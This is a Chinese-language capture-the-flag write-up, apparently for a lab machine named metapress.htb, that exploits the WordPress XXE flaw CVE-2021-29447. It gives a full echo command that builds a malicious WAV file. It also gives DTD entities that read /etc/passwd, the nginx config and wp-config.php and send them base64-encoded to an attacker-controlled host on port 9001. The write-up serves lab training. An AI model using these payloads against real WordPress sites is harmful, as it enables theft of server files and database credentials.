查找对应版本的漏洞`CVE-2021-29447`

<mark class="encrypted">f21K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6@1M7Y4W2Z5j5h3y4C8L8h3g2Q4x3X3g2U0L8$3#2Q4x3V1k6J5L8$3!0E0i4K6u0r3N6$3!0J5k6s2m8J5k6i4y4K6j5%4k6W2x3U0l9J5x3e0t1&6y4o6b7%4</mark>

我们需要创建一个WAV文件，该文件将获取另一个名为的文件`dedsec.dtd`，其中包含我们的恶意代码

```
❯ echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.XX.XX:9001/dedsec.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.XX.XX:9001/?p=%file;'>" >
```

启动PHP服务器

```
php -S 0.0.0.0:9001
```

![图片描述](upload/attach/202212/865065\_Z6PKEURNDD76F9J.png)

得到了`/etc/passwd`

```
echo -n '' | base64 -d
```

![图片描述](upload/attach/202212/865065\_C5GPXV68Q7FG7DC.png)

让我们获取 WordPress`wp-config.php`文件

```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/nginx/sites-enabled/default">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.xx.xx:9001/?p=%file;'>" >
```

![图片描述](upload/attach/202212/865065\_XDRF9N9275P4V2C.png)

![图片描述](upload/attach/202212/865065\_CPU97GTBEAM7G28.png)

```
server {
listen 80;
listen [::]:80;
root /var/www/metapress.htb/blog;
index index.php index.html;
if ($http\_host != "metapress.htb") {
rewrite ^ http://metapress.htb/;
}
location / {
try\_files $uri $uri/ /index.php?$args;
}
location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi\_pass unix:/var/run/php/php8.0-fpm.sock;
}
location ~\* \.(js|css|png|jpg|jpeg|gif|ico|svg)$ {
expires max;
log\_not\_found off;
}
}
```

得到了路径`/var/www/metapress.htb/blog`

```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/metapress.htb/blog/wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.xx.xx:9001/?p=%file;'>">
```

![图片描述](upload/attach/202212/865065\_X3M7445ZE2VRFZ4.png) ![图片描述](upload/attach/202212/865065\_T6NCX7QKAURWJFM.png)

```nginx
server {
    listen 80;
    listen [::]:80;
    root /var/www/metapress.htb/blog;
    index index.php index.html;
    if ($http_host != "metapress.htb") {
        rewrite ^ http://metapress.htb/;
    }

    location / {
        try_files $uri $uri/ /index.php?$args;
    }

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php8.0-fpm.sock;
    }

    location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg)$ {
        expires max;
        log_not_found off;
    }
}
```
